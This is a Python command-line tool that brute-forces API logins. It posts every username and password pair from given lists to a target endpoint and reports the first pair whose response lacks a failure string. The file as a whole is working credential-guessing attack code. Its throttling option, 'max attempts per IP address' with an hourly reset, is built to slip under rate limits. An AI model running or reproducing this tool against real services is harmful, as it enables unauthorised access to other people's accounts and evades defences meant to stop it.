import argparse
import requests
import json
import time
from itertools import cycle

# Define colors for terminal output
class Colors:
    RESET = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"

def load_file(file_path, encoding="utf-8"):
    try:
        with open(file_path, "r", encoding=encoding, errors="replace") as f:
            return [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"{Colors.RED}Error: File '{file_path}' not found.{Colors.RESET}")
        return []
    except Exception as e:
        print(f"{Colors.RED}Error reading file '{file_path}': {e}{Colors.RESET}")
        return []

def brute_force_api(url, users, passwords, headers, failure_response, attempts_limit, interval):
    attempts = 0
    start_time = time.time()

    # Perform brute-force
    for usr in users:
        for pwd in passwords:
            if attempts >= attempts_limit:
                elapsed_time = time.time() - start_time
                if elapsed_time < interval:
                    wait_time = interval - elapsed_time
                    print(f"{Colors.YELLOW}[!] Reached {attempts_limit} attempts. Waiting for {int(wait_time)} seconds...{Colors.RESET}")
                    time.sleep(wait_time)
                start_time = time.time()
                attempts = 0

            payload = {"username": usr, "password": pwd}
            print(f"{Colors.CYAN}[*] Trying username: {usr} | password: {pwd}{Colors.RESET}")
            try:
                response = requests.post(url, json=payload, headers=headers)
                attempts += 1

                if failure_response in response.text:
                    print(f"{Colors.RED}[-] Failed: {usr}:{pwd}{Colors.RESET}")
                else:
                    print(f"{Colors.GREEN}[+] Success: {usr}:{pwd}{Colors.RESET}")
                    return  # Stop after first success
            except requests.RequestException as e:
                print(f"{Colors.RED}[!] Error making request: {e}{Colors.RESET}")
                return

def main():
    parser = argparse.ArgumentParser(description="API Brute-Force Tool with Rate Limiting and Color-Coded Output")
    parser.add_argument("-l", "--user", help="Single username to test")
    parser.add_argument("-L", "--user-list", help="File containing a list of usernames")
    parser.add_argument("-p", "--password", help="Single password to test")
    parser.add_argument("-P", "--password-list", help="File containing a list of passwords")
    parser.add_argument("-u", "--url", required=True, help="Target URL for the API endpoint")
    parser.add_argument("--headers", help="Custom headers as JSON string", default="{}")
    parser.add_argument("--failure", required=True, help="Text to indicate a failed login")
    parser.add_argument("--attempts", type=int, default=100, help="Max attempts per IP address (default: 100)")
    parser.add_argument("--interval", type=int, default=3600, help="Interval in seconds to reset attempts (default: 3600)")
    args = parser.parse_args()

    if not args.user and not args.user_list:
        print(f"{Colors.RED}Error: You must specify either a single user (-l) or a user list (-L).{Colors.RESET}")
        return
    if not args.password and not args.password_list:
        print(f"{Colors.RED}Error: You must specify either a single password (-p) or a password list (-P).{Colors.RESET}")
        return

    try:
        headers = json.loads(args.headers)
    except json.JSONDecodeError:
        print(f"{Colors.RED}Error: Invalid JSON format for headers.{Colors.RESET}")
        return

    users = [args.user] if args.user else load_file(args.user_list)
    passwords = [args.password] if args.password else load_file(args.password_list)

    brute_force_api(
        url=args.url,
        users=users,
        passwords=passwords,
        headers=headers,
        failure_response=args.failure,
        attempts_limit=args.attempts,
        interval=args.interval
    )

if __name__ == "__main__":
    main()
